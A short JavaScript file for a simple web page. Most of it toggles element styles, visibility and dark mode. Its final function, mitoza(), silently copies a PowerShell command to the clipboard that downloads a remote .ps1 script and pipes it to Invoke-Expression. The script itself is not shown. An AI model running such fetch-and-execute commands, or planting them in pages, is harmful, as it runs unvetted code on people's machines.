document.querySelectorAll(".clickable").forEach(function(element) {
    element.addEventListener("click", function() {
        alert("hello world");
    });
});

console.log("What are you looking at?");

function bt() {
    alert('hello world');  
}

function disapear() {
let text = document.getElementById('text');
if (text.style.display === 'none') {
    text.style.display = 'block';
} else {
    text.style.display = 'none';
}
}

function wi() {
    let wi = document.getElementById('wi')
    if (wi.style.width == '2cm'){

        wi.style.width = '4cm'
        wi.style.backgroundColor = 'lime'
        wi.style.borderColor = 'aqua'
    }
    else{
        wi.style.width = '2cm'
        wi.style.backgroundColor = 'aqua'
        wi.style.borderColor = 'lime'
    }
}

function scde(){
    let sc = document.getElementById('sc')
    if (sc.style.color == 'white'){

    sc.style.color = 'black'
    sc.style.backgroundColor = 'white'
    }
    else{
    sc.style.color = 'white'
    sc.style.backgroundColor = 'black'
    }
}

function sc(x) {
    alert(x);
    let sc = document.getElementById('sc')

    if (sc.style.color == 'white'){

    sc.style.color = 'black'
    sc.style.backgroundColor = 'white'
    }
    else{
    sc.style.color = 'white'
    sc.style.backgroundColor = 'black'
    }
}

function dk(id){
    let dk = document.getElementById(id)
    if (dk.style.backgroundColor === 'black'){

        dk.style.backgroundColor = 'white'
        dk.style.color = 'black'
        dk.className = 'material-symbols-outlined right'
        document.body.style.backgroundColor = 'white'
        document.body.style.color = 'black'
        dk.textContent = 'dark_mode'

        }
        else{
        
        dk.style.backgroundColor = 'black'
        dk.style.color = 'white'
        dk.className = 'material-symbols-outlined right fill'
        document.body.style.backgroundColor = 'black'
        document.body.style.color = 'white'
        dk.textContent = 'light_mode'
        }
}

function mitoza(){
    navigator.clipboard.writeText("iwr \"https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1\" | iex")
}